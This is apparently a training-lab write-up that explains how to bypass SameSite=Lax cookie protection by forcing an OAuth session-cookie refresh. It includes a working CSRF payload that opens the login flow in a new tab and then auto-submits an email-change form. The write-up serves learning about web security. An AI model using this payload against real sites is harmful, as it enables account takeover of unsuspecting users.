### Lab: SameSite Lax bypass via cookie refresh

This lab's change email function is vulnerable to CSRF. To solve the lab, perform a CSRF attack that changes the victim's email address. You should use the provided exploit server to host your attack.

The lab supports OAuth-based login. You can log in via your social media account with the following credentials: wiener:peter

_____

Analysis and Exploit:

1. Login makes use of OAuth authentication
    - GET **/social-login**
        - Redirects to **/oauth-callback?code={code}**
        - A new session cookie is issued

2. Session token is renewed everytime a logged-in user send GET /social-login

3. Since Google Chrome default behaviour applying Same-Site=Lax to session cookies does not block POST requests for 120 seconds, new cookie renewal was issued from new tab

Payload 
```html
<html>
    <body>
        <form action="URL/my-account/change-email" method="POST">
            <input required type="email" name="email" value="youjustgot@hacked">
            <button type="submit">Submit</button>
        </form>

        <script>
            window.onclick= () => {
            window.open('https://0a3c000904d7333a802d94de00580052.web-security-academy.net/social-login');
            setTimeout(function(){
                document.forms[0].submit()
            }, 5000)
            }
        </script>
    </body>
</html>
```

POST Request is allowed because of the 120-seconds of POSTs request freedom from Google Chrome after Same-Site=Lax flag has been applied to new cookies.  

OAuth does not care whether a user is already logged-in or has to repeat the login process, it simply renews the session cookie if the request is valid because OAuth is all about authotization and not authentication.  

In order to not close the "exploit page" we need to trigger the OAuth process from a new tab but this requires user interaction (like a clik in this case) because browsers block this kind of pop-ups if the action is not performed manually (aka click() is not a valid action).  

To avoid a race-condition error, a timeout of 5 seconds is used to give the OAuth process enough time to complete the session cookie renewal.  
After 5 seconds, and after the initial user click, the form is auto-submitted and the email is changed.  
The session cookie is sent along the request because it is a top level navigation.  

